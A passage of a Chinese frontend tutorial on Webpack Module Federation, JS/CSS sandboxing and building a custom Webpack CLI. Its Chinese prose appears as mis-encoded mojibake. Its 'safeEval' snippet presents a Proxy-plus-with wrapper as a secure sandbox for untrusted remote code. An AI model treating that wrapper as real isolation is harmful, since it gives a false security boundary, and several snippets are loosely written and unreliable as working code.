class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Webpacké…ç½®</span><br><span class="hljs-attr">shared</span>: &#123;<br>  <span class="hljs-attr">react</span>: &#123; <span class="hljs-attr">eager</span>: <span class="hljs-literal">true</span> &#125; <span class="hljs-comment">// åŒæ­¥åŠ è½½</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(3) æŒ‰è·¯ç”±åŠ¨æ€å…±äº«</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŠ¨æ€åŠ è½½å…±äº«é…ç½®</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">getSharedDeps</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (route.<span class="hljs-property">path</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-string">&#x27;admin-libs&#x27;</span>: <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;admin-app/shared-libs&#x27;</span>)<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> &#123;&#125;<br>&#125;<br><br><span class="hljs-comment">// åŒ…è£¹åº”ç”¨æ¸²æŸ“</span><br>&lt;<span class="hljs-title class_">ModuleFederationContext</span>.<span class="hljs-property">Provider</span> value=&#123;<span class="hljs-title function_">getSharedDeps</span>()&#125;&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">ModuleFederationContext</span>.<span class="hljs-property">Provider</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨æ²™ç®±ç­–ç•¥</strong></p><p>(1) CSSéš”ç¦»æ–¹æ¡ˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Webpacké…ç½®</span><br>&#123;<br>  <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>,<br>  <span class="hljs-attr">use</span>: [<br>    &#123;<br>      <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;style-loader&#x27;</span>,<br>      <span class="hljs-attr">options</span>: &#123; <br>        <span class="hljs-attr">injectType</span>: <span class="hljs-string">&#x27;shadowDom&#x27;</span> <span class="hljs-comment">// ä½¿ç”¨Shadow DOMéš”ç¦»</span><br>      &#125;<br>    &#125;,<br>    <span class="hljs-string">&#x27;css-loader&#x27;</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) JSæ‰§è¡Œæ²™ç®±</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºå®‰å…¨æ‰§è¡Œç¯å¢ƒ</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">safeEval</span> = (<span class="hljs-params">code, sandbox</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(sandbox, &#123;<br>    <span class="hljs-attr">has</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">target, key</span>) =&gt;</span> key === <span class="hljs-title class_">Symbol</span>.<span class="hljs-property">unscopables</span> ? <span class="hljs-literal">undefined</span> : target[key]<br>  &#125;);<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;sandbox&#x27;</span>, <span class="hljs-string">`with(sandbox)&#123;<span class="hljs-subst">$&#123;code&#125;</span>&#125;`</span>).<span class="hljs-title function_">bind</span>(proxy)(proxy);<br>&#125;<br><br><span class="hljs-comment">// æ‰§è¡Œè¿œç¨‹æ¨¡å—</span><br><span class="hljs-keyword">const</span> remoteModule = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;untrustedApp/module&#x27;</span>);<br><span class="hljs-title function_">safeEval</span>(remoteModule.<span class="hljs-property">init</span>, &#123; <span class="hljs-variable language_">console</span>, <span class="hljs-title class_">Date</span> &#125;);<br></code></pre></td></tr></table></figure><p>(3) APIè®¿é—®æ§åˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºå®‰å…¨ä»£ç†å¯¹è±¡</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">createSafeAPI</span> = (<span class="hljs-params"></span>) =&gt; (&#123;<br>  <span class="hljs-attr">localStorage</span>: &#123;<br>    <span class="hljs-attr">getItem</span>: <span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> key.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;safe_&#x27;</span>) ? <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(key) : <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">setItem</span>: <span class="hljs-function">(<span class="hljs-params">key, val</span>) =&gt;</span> &#123; <span class="hljs-comment">/* è¿‡æ»¤å†™å…¥ */</span> &#125;<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// æ³¨å…¥å…±äº«API</span><br><span class="hljs-attr">shared</span>: &#123;<br>  <span class="hljs-string">&#x27;@safe-api&#x27;</span>: &#123;<br>    <span class="hljs-attr">import</span>: createSafeAPI,<br>    <span class="hljs-attr">eager</span>: <span class="hljs-literal">true</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç›‘æ§ä¸è¯Šæ–­ä½“ç³»</strong></p><p>(1) å…±äº«æ¨¡å—å¥åº·æ£€æŸ¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è¿è¡Œæ—¶ç›‘æ§</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;federated-module-error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  sentry.<span class="hljs-title function_">captureException</span>(e.<span class="hljs-property">detail</span>.<span class="hljs-property">error</span>);<br>  <span class="hljs-title function_">showErrorToast</span>(<span class="hljs-string">`æ¨¡å—åŠ è½½å¤±è´¥: <span class="hljs-subst">$&#123;e.detail.moduleName&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) æ€§èƒ½è¿½è¸ª</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è®°å½•æ¨¡å—åŠ è½½æ—¶é—´</span><br>performance.<span class="hljs-title function_">mark</span>(<span class="hljs-string">&#x27;start-load-shared&#x27;</span>);<br><span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;shared-lib&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  performance.<span class="hljs-title function_">measure</span>(<span class="hljs-string">&#x27;shared-load&#x27;</span>, <span class="hljs-string">&#x27;start-load-shared&#x27;</span>);<br>  <span class="hljs-title function_">reportPerfData</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) ä¾èµ–å…³ç³»å¯è§†åŒ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç”Ÿæˆå…±äº«å›¾è°±</span><br>npx module-federation-stats --json &gt; stats.json<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•æ·±åº¦é—®é¢˜</strong></p><p>Qï¼šå¦‚ä½•å®ç°CSSè·¨åº”ç”¨éš”ç¦»ï¼Ÿ</p><ul><li>Shadow DOM åŸç”Ÿéš”ç¦»</li><li>CSS Module å‘½åç©ºé—´</li><li>PostCSS æ·»åŠ ä½œç”¨åŸŸå‰ç¼€</li><li>è¿è¡Œæ—¶æ ·å¼å¸è½½æœºåˆ¶</li></ul><p>Qï¼šå…±äº«Redux Storeæ—¶å¦‚ä½•é¿å…æ±¡æŸ“ï¼Ÿ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºå‘½åç©ºé—´Store</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">createScopedStore</span> = (<span class="hljs-params">rootStore</span>) =&gt; (&#123;<br>  <span class="hljs-attr">dispatch</span>: <span class="hljs-function"><span class="hljs-params">action</span> =&gt;</span> rootStore.<span class="hljs-title function_">dispatch</span>(&#123; ...action, <span class="hljs-attr">meta</span>: &#123; <span class="hljs-attr">scope</span>: <span class="hljs-string">&#x27;app1&#x27;</span> &#125; &#125;),<br>  <span class="hljs-attr">getState</span>: <span class="hljs-function">() =&gt;</span> rootStore.<span class="hljs-title function_">getState</span>().<span class="hljs-property">app1</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>Qï¼šå¦‚ä½•è®¾è®¡ç°åº¦å‘å¸ƒæ–¹æ¡ˆï¼Ÿ</p><p>æ¶æ„ï¼š</p><ul><li>é€šè¿‡URLå‚æ•°æ§åˆ¶ç‰ˆæœ¬ (?shared_react&#x3D;18.2)</li><li>é…ç½®ä¸­å¿ƒä¸‹å‘å…±äº«ç­–ç•¥</li><li>åŠ¨æ€åŠ è½½å¯¹åº”ç‰ˆæœ¬çš„ remoteEntry.js</li><li>ç›‘æ§é”™è¯¯ç‡è‡ªåŠ¨å›æ»š</li></ul><h2 id="4-3-è‡ªå®šä¹‰æ„å»ºæµç¨‹"><a href="#4-3-è‡ªå®šä¹‰æ„å»ºæµç¨‹" class="headerlink" title="4.3 è‡ªå®šä¹‰æ„å»ºæµç¨‹"></a>4.3 è‡ªå®šä¹‰æ„å»ºæµç¨‹</h2><h3 id="4-3-1-ç¼–å†™CLIå·¥å…·é›†æˆWebpack"><a href="#4-3-1-ç¼–å†™CLIå·¥å…·é›†æˆWebpack" class="headerlink" title="4.3.1 ç¼–å†™CLIå·¥å…·é›†æˆWebpack"></a>4.3.1 ç¼–å†™CLIå·¥å…·é›†æˆWebpack</h3><p><strong>CLI å·¥å…·æ ¸å¿ƒæ¶æ„</strong></p><pre class="mermaid">graph TD  CLI[å‘½ä»¤è¡Œå·¥å…·] --> Parser[å‚æ•°è§£æ]  Parser --> Config[åŠ¨æ€ç”ŸæˆWebpacké…ç½®]  Config --> Executor[æ‰§è¡ŒWebpackæ„å»º]  Executor --> Reporter[æ„å»ºç»“æœåˆ†æ]  Reporter --> Notifier[é€šçŸ¥æœºåˆ¶]</pre><p><strong>åŸºç¡€å®ç°æ­¥éª¤</strong></p><p>(1) åˆå§‹åŒ– CLI å·¥ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> my-webpack-cli &amp;&amp; <span class="hljs-built_in">cd</span> my-webpack-cli<br>npm init -y<br>npm install webpack webpack-cli commander chalk ora @types/node -D<br></code></pre></td></tr></table></figure><p>(2) åˆ›å»ºå‘½ä»¤å…¥å£</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// bin/cli.js</span><br>#!<span class="hljs-regexp">/usr/</span>bin/env node<br><span class="hljs-keyword">const</span> &#123; program &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;commander&#x27;</span>);<br><span class="hljs-keyword">const</span> build = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../lib/build&#x27;</span>);<br><br>program<br>  .<span class="hljs-title function_">command</span>(<span class="hljs-string">&#x27;build&#x27;</span>)<br>  .<span class="hljs-title function_">option</span>(<span class="hljs-string">&#x27;--env &lt;env&gt;&#x27;</span>, <span class="hljs-string">&#x27;è®¾ç½®æ„å»ºç¯å¢ƒ&#x27;</span>, <span class="hljs-string">&#x27;production&#x27;</span>)<br>  .<span class="hljs-title function_">option</span>(<span class="hljs-string">&#x27;--analyze&#x27;</span>, <span class="hljs-string">&#x27;å¯ç”¨åŒ…åˆ†æ&#x27;</span>)<br>  .<span class="hljs-title function_">action</span>(<span class="hljs-function"><span class="hljs-params">options</span> =&gt;</span> &#123;<br>    <span class="hljs-title function_">build</span>(options);<br>  &#125;);<br><br>program.<span class="hljs-title function_">parse</span>(process.<span class="hljs-property">argv</span>);<br></code></pre></td></tr></table></figure><p>(3) åŠ¨æ€ç”Ÿæˆ Webpack é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// lib/build.js</span><br><span class="hljs-keyword">const</span> webpack = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">generateConfig</span> = (<span class="hljs-params">options</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> base = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./webpack.base&#x27;</span>);<br>  <span class="hljs-keyword">const</span> envConfig = <span class="hljs-built_in">require</span>(<span class="hljs-string">`./webpack.<span class="hljs-subst">$&#123;options.env&#125;</span>`</span>);<br>  <br>  <span class="hljs-keyword">return</span> &#123; <br>    ...base, <br>    ...envConfig,<br>    <span class="hljs-attr">plugins</span>: options.<span class="hljs-property">analyze</span> <br>      ? [...envConfig.<span class="hljs-property">plugins</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>()] <br>      : envConfig.<span class="hljs-property">plugins</span><br>  &#125;;<br>&#125;;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">async</span> (options) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> config = <span class="hljs-title function_">generateConfig</span>(options);<br>  <span class="hljs-keyword">const</span> compiler = <span class="hljs-title function_">webpack</span>(config);<br>  <br>  <span class="hljs-comment">// æ‰§è¡Œæ„å»º</span><br>  compiler.<span class="hljs-title function_">run</span>(<span class="hljs-function">(<span class="hljs-params">err, stats</span>) =&gt;</span> &#123; ... &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒå¢å¼ºåŠŸèƒ½å®ç°</strong></p><p>(1) å¤šè¿›ç¨‹ç¼–è¯‘åŠ é€Ÿ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é›†æˆ thread-loader</span><br><span class="hljs-keyword">const</span> threadLoader = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;thread-loader&#x27;</span>);<br><br>threadLoader.<span class="hljs-title function_">warmup</span>(&#123;<br>  <span class="hljs-attr">workers</span>: <span class="hljs-number">4</span>,<br>  <span class="hljs-attr">poolTimeout</span>: <span class="hljs-title class_">Infinity</span><br>&#125;, [<span class="hljs-string">&#x27;babel-loader&#x27;</span>]);<br><br><span class="hljs-comment">// webpack é…ç½®</span><br><span class="hljs-attr">module</span>: &#123;<br>  <span class="hljs-attr">rules</span>: [&#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>,<br>    <span class="hljs-attr">use</span>: [<br>      &#123; <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;thread-loader&#x27;</span>, <span class="hljs-attr">options</span>: &#123; <span class="hljs-attr">workers</span>: <span class="hljs-number">4</span> &#125; &#125;,<br>      <span class="hljs-string">&#x27;babel-loader&#x27;</span><br>    ]<br>  &#125;]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) æ™ºèƒ½ç¼“å­˜ç­–ç•¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®ç¯å¢ƒå¯ç”¨ç¼“å­˜</span><br><span class="hljs-keyword">const</span> &#123; cache &#125; = options.<span class="hljs-property">env</span> === <span class="hljs-string">&#x27;development&#x27;</span><br>  ? &#123; <span class="hljs-attr">cache</span>: &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;memory&#x27;</span> &#125; &#125;<br>  : &#123; <span class="hljs-attr">cache</span>: &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;filesystem&#x27;</span>, <span class="hljs-attr">cacheDirectory</span>: <span class="hljs-string">&#x27;.cache&#x27;</span> &#125; &#125;;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  ...config,<br>  cache<br>&#125;;<br></code></pre></td></tr></table></figure><p>(3) æ„å»ºè¿›åº¦å¯è§†åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ ora + webpack è¿›åº¦æ’ä»¶</span><br><span class="hljs-keyword">const</span> ora = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ora&#x27;</span>);<br><span class="hljs-keyword">const</span> spinner = <span class="hljs-title function_">ora</span>(<span class="hljs-string">&#x27;å¼€å§‹æ„å»º...&#x27;</span>).<span class="hljs-title function_">start</span>();<br><br><span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">ProgressPlugin</span>(<span class="hljs-function">(<span class="hljs-params">percentage, message</span>) =&gt;</span> &#123;<br>  spinner.<span class="hljs-property">text</span> = <span class="hljs-string">`æ„å»ºè¿›åº¦ <span class="hljs-subst">$&#123;(percentage * <span class="hljs-number">100</span>).toFixed(<span class="hljs-number">2</span>)&#125;</span>%: <span class="hljs-subst">$&#123;message&#125;</span>`</span>;<br>  <span class="hljs-keyword">if</span> (percentage === <span class="hljs-number">1</span>) spinner.<span class="hljs-title function_">succeed</span>(<span class="hljs-string">&#x27;æ„å»ºå®Œæˆ&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>ä¼ä¸šçº§åŠŸèƒ½æ‰©å±•</strong></p><p>(1) é…ç½®æ–‡ä»¶çƒ­æ›´æ–°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç›‘å¬é…ç½®å˜åŒ–</span><br><span class="hljs-keyword">const</span> chokidar = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;chokidar&#x27;</span>);<br><br>chokidar.<span class="hljs-title function_">watch</span>(<span class="hljs-string">&#x27;config/**/*.js&#x27;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;change&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;é…ç½®æ›´æ–°ï¼Œè‡ªåŠ¨é‡å¯æ„å»º...&#x27;</span>);<br>  compiler.<span class="hljs-title function_">close</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    compiler = <span class="hljs-title function_">webpack</span>(<span class="hljs-title function_">generateConfig</span>(options));<br>    compiler.<span class="hljs-title function_">run</span>();<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) å¤šé¡¹ç›®é…ç½®ç®¡ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ”¯æŒé¡¹ç›®é€‰æ‹©</span><br>program<br>  .<span class="hljs-title function_">command</span>(<span class="hljs-string">&#x27;build&#x27;</span>)<br>  .<span class="hljs-title function_">option</span>(<span class="hljs-string">&#x27;--project &lt;name&gt;&#x27;</span>, <span class="hljs-string">&#x27;æŒ‡å®šé¡¹ç›®åç§°&#x27;</span>)<br>  .<span class="hljs-title function_">action</span>(<span class="hljs-function"><span class="hljs-params">options</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> projectConfig = <span class="hljs-title function_">loadProjectConfig</span>(options.<span class="hljs-property">project</span>);<br>    <span class="hljs-title function_">build</span>(&#123; ...options, ...projectConfig &#125;);<br>  &#125;);<br><br><span class="hljs-comment">// é¡¹ç›®é…ç½®æ–‡ä»¶</span><br><span class="hljs-comment">// projects/dashboard.json</span><br>&#123;<br>  <span class="hljs-string">&quot;entry&quot;</span>: <span class="hljs-string">&quot;./src/dashboard.js&quot;</span>,<br>  <span class="hljs-string">&quot;outputPath&quot;</span>: <span class="hljs-string">&quot;dist/dashboard&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(3) æ„å»ºç»“æœåˆ†ææŠ¥å‘Š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç”ŸæˆHTMLæŠ¥å‘Š</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ReportGenerator</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack-bundle-analyzer&#x27;</span>).<span class="hljs-property">BundleAnalyzerPlugin</span>;<br><br>compiler.<span class="hljs-title function_">run</span>(<span class="hljs-function">(<span class="hljs-params">err, stats</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> report = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReportGenerator</span>(stats.<span class="hljs-title function_">toJson</span>()).<span class="hljs-title function_">generate</span>();<br>  fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">&#x27;report.html&#x27;</span>, report.<span class="hljs-property">html</span>);<br>  <br>  <span class="hljs-comment">// å…³é”®æŒ‡æ ‡æå–</span><br>  <span class="hljs-keyword">const</span> &#123; assets, warnings &#125; = stats.<span class="hljs-title function_">toJson</span>();<br>  <span class="hljs-keyword">const</span> mainSize = assets.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> a.<span class="hljs-property">name</span> === <span class="hljs-string">&#x27;main.js&#x27;</span>).<span class="hljs-property">size</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä¸»åŒ…ä½“ç§¯: <span class="hljs-subst">$&#123;(mainSize / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">2</span>)&#125;</span>KB`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å‘å¸ƒä¸é›†æˆ</strong></p><p>(1) å…¨å±€å®‰è£…</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-comment">// package.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-webpack-cli&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;bin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;mwpack&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./bin/cli.js&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g my-webpack-cli<br>mwpack build --<span class="hljs-built_in">env</span>=<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>(2) CI&#x2F;CD é›†æˆ</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># .gitlab-ci.yml</span><br><span class="hljs-attr">build_prod:</span><br>  <span class="hljs-attr">stage:</span> <span class="hljs-string">build</span><br>  <span class="hljs-attr">script:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">mwpack</span> <span class="hljs-string">build</span> <span class="hljs-string">--env=production</span> <span class="hljs-string">--analyze</span><br>  <span class="hljs-attr">artifacts:</span><br>    <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">dist/</span><br></code></pre></td></tr></table></figure><p>(3) æ’ä»¶æ‰©å±•æœºåˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ’ä»¶ç³»ç»Ÿè®¾è®¡</span><br>program.<span class="hljs-property">plugin</span> = <span class="hljs-function">(<span class="hljs-params">hook, fn</span>) =&gt;</span> &#123;<br>  pluginHooks[hook] = [...(pluginHooks[hook] || []), fn];<br>&#125;;<br><br><span class="hljs-comment">// ç”¨æˆ·æ’ä»¶</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">cli</span>) =&gt;</span> &#123;<br>  cli.<span class="hljs-title 